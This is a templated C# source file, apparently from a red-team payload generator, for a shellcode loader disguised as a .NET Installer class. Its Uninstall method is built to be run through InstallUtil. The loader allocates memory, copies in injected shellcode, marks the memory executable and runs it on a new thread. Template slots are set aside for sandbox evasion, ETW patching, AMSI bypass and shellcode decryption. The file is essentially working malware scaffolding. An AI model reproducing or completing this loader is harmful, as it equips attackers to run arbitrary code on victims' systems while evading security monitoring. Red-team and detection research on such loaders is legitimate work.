using System;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Configuration.Install;
{{ crypto_using }}

namespace {{ namespace }}
{
    [RunInstaller(true)]
    public class {{ classname }} : Installer
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
{{ amsi_imports }}

        public override void Uninstall(System.Collections.IDictionary savedState)
        {
{{ sandbox_block }}
{{ etw_block }}
{{ amsi_block }}
            byte[] {% if is_encrypted %}enc{% else %}buf{% endif %} = new byte[] { {{ shellcode }} };
{{ decrypt_block }}
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x04);
            Marshal.Copy(buf, 0, addr, buf.Length);
            uint _vp;
            VirtualProtect(addr, (uint)buf.Length, 0x20, out _vp);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 5000); // 5s timeout for testing
        }
    }
}
